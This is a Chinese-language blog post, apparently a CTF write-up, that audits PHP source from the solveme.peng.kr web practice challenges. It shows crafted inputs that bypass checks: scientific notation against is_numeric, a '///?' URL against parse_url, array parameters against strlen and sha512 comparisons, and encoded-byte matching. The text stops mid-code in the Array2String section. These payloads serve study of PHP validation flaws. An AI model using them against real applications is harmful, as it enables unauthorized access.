<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="0x01 Warm up123456781wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY&#x3D; &lt;?php    error_reporting(0);    require __DIR__.&#39;&#x2F;lib.php&#39;;    echo base64_encode(hex2bin(strrev(bin2hex($">
<meta property="og:type" content="article">
<meta property="og:title" content="solveme.peng.kr_Web代码审计练习">
<meta property="og:url" content="http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="0x01 Warm up123456781wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY&#x3D; &lt;?php    error_reporting(0);    require __DIR__.&#39;&#x2F;lib.php&#39;;    echo base64_encode(hex2bin(strrev(bin2hex($">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2018-04-10T07:47:04.000Z">
<meta property="article:modified_time" content="2020-09-22T00:21:25.710Z">
<meta property="article:author" content="Kirin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo.jpg">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo.jpg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.jpg">
          
        
    
    <!-- title -->
    <title>solveme.peng.kr_Web代码审计练习</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/04/11/dvwa-sql-injection/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/04/09/CTF-RSA%E5%9F%BA%E6%9C%AC%E7%A0%B4%E8%A7%A3%E5%A7%BF%E5%8A%BF/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&text=solveme.peng.kr_Web代码审计练习" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&title=solveme.peng.kr_Web代码审计练习" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&is_video=false&description=solveme.peng.kr_Web代码审计练习" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=solveme.peng.kr_Web代码审计练习&body=Check out this article: http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&title=solveme.peng.kr_Web代码审计练习" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&title=solveme.peng.kr_Web代码审计练习" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&title=solveme.peng.kr_Web代码审计练习" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&title=solveme.peng.kr_Web代码审计练习" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&name=solveme.peng.kr_Web代码审计练习&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Warm-up"><span class="toc-number">1.</span> <span class="toc-text">0x01 Warm up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Thirty-six"><span class="toc-number">2.</span> <span class="toc-text">0x02  Thirty six</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Bad-compare"><span class="toc-number">3.</span> <span class="toc-text">0x03 Bad compare</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Winter-sleep"><span class="toc-number">4.</span> <span class="toc-text">0x04  Winter sleep</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Hard-login"><span class="toc-number">5.</span> <span class="toc-text">0x05 Hard login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-URL-filtering"><span class="toc-number">6.</span> <span class="toc-text">0x06 URL filtering</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-Hash-collision"><span class="toc-number">7.</span> <span class="toc-text">0x07  Hash collision</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-Array2String"><span class="toc-number">8.</span> <span class="toc-text">0x08  Array2String</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-Give-me-a-link-2"><span class="toc-number">9.</span> <span class="toc-text">0x09 Give me a link 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0A-Give-me-a-link"><span class="toc-number">10.</span> <span class="toc-text">0x0A Give me a link</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0B-Replace-filter"><span class="toc-number">11.</span> <span class="toc-text">0x0B Replace filter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0C-Hell-JS"><span class="toc-number">12.</span> <span class="toc-text">0x0C Hell JS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0D-Anti-SQLi"><span class="toc-number">13.</span> <span class="toc-text">0x0D Anti SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0E-Name-check"><span class="toc-number">14.</span> <span class="toc-text">0x0E Name check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0F-Super-secure-hash"><span class="toc-number">15.</span> <span class="toc-text">0x0F Super secure hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-I-am-slowly"><span class="toc-number">16.</span> <span class="toc-text">0x10  I am slowly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-Cheap-lottery"><span class="toc-number">17.</span> <span class="toc-text">0x11 Cheap lottery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-Check-via-eval"><span class="toc-number">18.</span> <span class="toc-text">0x12 Check via eval</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        solveme.peng.kr_Web代码审计练习
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-04-10T07:47:04.000Z" itemprop="datePublished">2018-04-10</time>
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/Web/" rel="tag">Web</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="0x01-Warm-up"><a href="#0x01-Warm-up" class="headerlink" title="0x01 Warm up"></a>0x01 Warm up</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY&#x3D; </span><br><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(hex2bin(strrev(bin2hex($flag)))), &#39;&lt;hr&gt;&#39;;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>很简单的一连串编码<br>逆方向解出即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY&#x3D;&quot;.decode(&quot;base64&quot;).encode(&quot;hex&quot;)[::-1].decode(&quot;hex&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="0x02-Thirty-six"><a href="#0x02-Thirty-six" class="headerlink" title="0x02  Thirty six"></a>0x02  Thirty six</h2><p>根据提示将数字转换为36进制，不是审计，记一下脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def x2y(x,y):#任意进制转换:2~36</span><br><span class="line">    a&#x3D;&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line">    b&#x3D;[]</span><br><span class="line">    flag&#x3D;1</span><br><span class="line">    while flag:</span><br><span class="line">        flag&#x3D;x&#x2F;&#x2F;y</span><br><span class="line">        z&#x3D;x%y</span><br><span class="line">        b&#x3D;b+[z]</span><br><span class="line">        x&#x3D;flag</span><br><span class="line">    b.reverse()</span><br><span class="line">    ans&#x3D;&quot;&quot;</span><br><span class="line">    for i in b:</span><br><span class="line">        ans+&#x3D;a[i]</span><br><span class="line">    print ans</span><br><span class="line">x2y(59714216653669596140166323768414581512983971077273551022216,36)</span><br></pre></td></tr></table></figure>
<h2 id="0x03-Bad-compare"><a href="#0x03-Bad-compare" class="headerlink" title="0x03 Bad compare"></a>0x03 Bad compare</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">   if(isset($_GET[&#39;answer&#39;]))&#123;</span><br><span class="line"></span><br><span class="line">       if($_GET[&#39;answer&#39;] &#x3D;&#x3D;&#x3D; &#39;尊찢悼嚴隆&#39;)&#123;</span><br><span class="line">           echo $flag;</span><br><span class="line">       &#125;else&#123;</span><br><span class="line">           echo &#39;Wrong answer&#39;;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>直接get提交：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?answer&#x3D;&#39;尊찢悼嚴隆&#39;</span><br></pre></td></tr></table></figure>
<p>会出错，猜测是返回的数据在浏览器解析上有问题：<br>把回显保存成文件再在16进制工具下打开：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  -o  .&#x2F;answer.txt  http:&#x2F;&#x2F;badcompare.solveme.peng.kr&#x2F;?</span><br></pre></td></tr></table></figure>
<p>找到对应数据为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F0EEC2F5D3FAE5F1D7CC</span><br></pre></td></tr></table></figure>
<p>php:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$t&#x3D;&#39;F0EEC2F5D3FAE5F1D7CC&#39;;</span><br><span class="line">	$s&#x3D;hex2bin($t);</span><br><span class="line">	echo urlencode($s);</span><br><span class="line"> ?&gt;</span><br><span class="line">#%F0%EE%C2%F5%D3%FA%E5%F1%D7%CC</span><br></pre></td></tr></table></figure>
<p>提交即得flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?answer&#x3D;%F0%EE%C2%F5%D3%FA%E5%F1%D7%CC</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Winter-sleep"><a href="#0x04-Winter-sleep" class="headerlink" title="0x04  Winter sleep"></a>0x04  Winter sleep</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">   if(isset($_GET[&#39;time&#39;]))&#123;</span><br><span class="line"></span><br><span class="line">       if(!is_numeric($_GET[&#39;time&#39;]))&#123;</span><br><span class="line">           echo &#39;The time must be number.&#39;;</span><br><span class="line"></span><br><span class="line">       &#125;else if($_GET[&#39;time&#39;] &lt; 60 * 60 * 24 * 30 * 2)&#123;</span><br><span class="line">           echo &#39;This time is too short.&#39;;</span><br><span class="line"></span><br><span class="line">       &#125;else if($_GET[&#39;time&#39;] &gt; 60 * 60 * 24 * 30 * 3)&#123;</span><br><span class="line">           echo &#39;This time is too long.&#39;;</span><br><span class="line"></span><br><span class="line">       &#125;else&#123;</span><br><span class="line">           sleep((int)$_GET[&#39;time&#39;]);</span><br><span class="line">           echo $flag;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>显然我们使用科学计数法绕过is_numeric,同时：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo (int)&#39;6e6&#39;;</span><br><span class="line">6</span><br></pre></td></tr></table></figure>
<p>此时进行比较时视为科学计数法，sleep时字符串视为6：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?time&#x3D;6e6</span><br></pre></td></tr></table></figure>
<h2 id="0x05-Hard-login"><a href="#0x05-Hard-login" class="headerlink" title="0x05 Hard login"></a>0x05 Hard login</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   session_start();</span><br><span class="line">   require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">   if(isset($_GET[&#39;username&#39;], $_GET[&#39;password&#39;]))&#123;</span><br><span class="line"></span><br><span class="line">       if(isset($_SESSION[&#39;hard_login_check&#39;]))&#123;</span><br><span class="line">           echo &#39;Already logged in..&#39;;</span><br><span class="line"></span><br><span class="line">       &#125;else if(!isset($_GET[&#39;username&#39;]&#123;3&#125;) || strtolower($_GET[&#39;username&#39;]) !&#x3D; $hidden_username)&#123;</span><br><span class="line">           echo &#39;Wrong username..&#39;;</span><br><span class="line"></span><br><span class="line">       &#125;else if(!isset($_GET[&#39;password&#39;]&#123;7&#125;) || $_GET[&#39;password&#39;] !&#x3D; $hidden_password)&#123;</span><br><span class="line">           echo &#39;Wrong password..&#39;;</span><br><span class="line"></span><br><span class="line">       &#125;else&#123;</span><br><span class="line">           $_SESSION[&#39;hard_login_check&#39;] &#x3D; true;</span><br><span class="line">           echo &#39;Login success!&#39;;</span><br><span class="line">           header(&#39;Location: .&#x2F;&#39;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!isset($_GET[&#39;username&#39;]&#123;3&#125;)</span><br></pre></td></tr></table></figure>
<p>检验$_GET[‘username’]{3}是否存在<br>即判断username的长度是否&gt;3<br>其实这题本身和login好像没关系<br>看到Location: ./<br>猜测应该是302跳转隐藏了flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;hardlogin.solveme.peng.kr&#x2F;</span><br></pre></td></tr></table></figure>
<p>命令行即见flag</p>
<h2 id="0x06-URL-filtering"><a href="#0x06-URL-filtering" class="headerlink" title="0x06 URL filtering"></a>0x06 URL filtering</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   require __DIR__.&quot;&#x2F;lib.php&quot;;</span><br><span class="line"></span><br><span class="line">   $url &#x3D; urldecode($_SERVER[&#39;REQUEST_URI&#39;]);</span><br><span class="line">   $url_query &#x3D; parse_url($url, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">   $params &#x3D; explode(&quot;&amp;&quot;, $url_query);</span><br><span class="line">   foreach($params as $param)&#123;</span><br><span class="line"></span><br><span class="line">       $idx_equal &#x3D; strpos($param, &quot;&#x3D;&quot;);</span><br><span class="line">       if($idx_equal &#x3D;&#x3D;&#x3D; false)&#123;</span><br><span class="line">           $key &#x3D; $param;</span><br><span class="line">           $value &#x3D; &quot;&quot;;</span><br><span class="line">       &#125;else&#123;</span><br><span class="line">           $key &#x3D; substr($param, 0, $idx_equal);</span><br><span class="line">           $value &#x3D; substr($param, $idx_equal + 1);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if(strpos($key, &quot;do_you_want_flag&quot;) !&#x3D;&#x3D; false || strpos($value, &quot;yes&quot;) !&#x3D;&#x3D; false)&#123;</span><br><span class="line">           die(&quot;no hack&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   if(isset($_GET[&#39;do_you_want_flag&#39;]) &amp;&amp; $_GET[&#39;do_you_want_flag&#39;] &#x3D;&#x3D; &quot;yes&quot;)&#123;</span><br><span class="line">       die($flag);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>显然需要构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?do_you_want_flag&#x3D;yes</span><br></pre></td></tr></table></figure>
<p>不过需要绕过parse_url：<br>当url类似：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x2F;?kirin.php</span><br></pre></td></tr></table></figure>
<p>parse_url会return null<br>构造下面url即可:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x2F;?do_you_want_flag&#x3D;yes</span><br></pre></td></tr></table></figure>
<p>关于parse_url记得文章：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;skysec.top&#x2F;2017&#x2F;12&#x2F;15&#x2F;parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="0x07-Hash-collision"><a href="#0x07-Hash-collision" class="headerlink" title="0x07  Hash collision"></a>0x07  Hash collision</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">   if(isset($_GET[&#39;foo&#39;], $_GET[&#39;bar&#39;]))&#123;</span><br><span class="line"></span><br><span class="line">       if(strlen($_GET[&#39;foo&#39;]) &gt; 30 || strlen($_GET[&#39;bar&#39;]) &gt; 30)&#123;</span><br><span class="line">           die(&#39;Too long&#39;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if($_GET[&#39;foo&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;bar&#39;])&#123;</span><br><span class="line">           die(&#39;Same value&#39;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if(hash(&#39;sha512&#39;, $_GET[&#39;foo&#39;]) !&#x3D;&#x3D; hash(&#39;sha512&#39;, $_GET[&#39;bar&#39;]))&#123;</span><br><span class="line">           die(&#39;Different hash&#39;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       echo $flag, &#39;&lt;hr&gt;&#39;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>这里使用!==,无法使用弱类型<br>我们可以构造数组绕过:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$user&#x3D;array(&quot;kirin&quot;,&quot;say&quot; );</span><br><span class="line">echo gettype(strlen($user));#NULL  NULL&lt;30</span><br><span class="line">echo gettype(hash(&#39;sha512&#39;, $user));#NULL  NULL&#x3D;&#x3D;&#x3D;NULL</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?foo[]&#x3D;kirin&amp;bar[]&#x3D;say</span><br></pre></td></tr></table></figure>
<h2 id="0x08-Array2String"><a href="#0x08-Array2String" class="headerlink" title="0x08  Array2String"></a>0x08  Array2String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">   $value &#x3D; $_GET[&#39;value&#39;];</span><br><span class="line"></span><br><span class="line">   $username &#x3D; $_GET[&#39;username&#39;];</span><br><span class="line">   $password &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line"></span><br><span class="line">   for ($i &#x3D; 0; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">       if ($_GET[&#39;username&#39;]) unset($username);</span><br><span class="line">       if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) 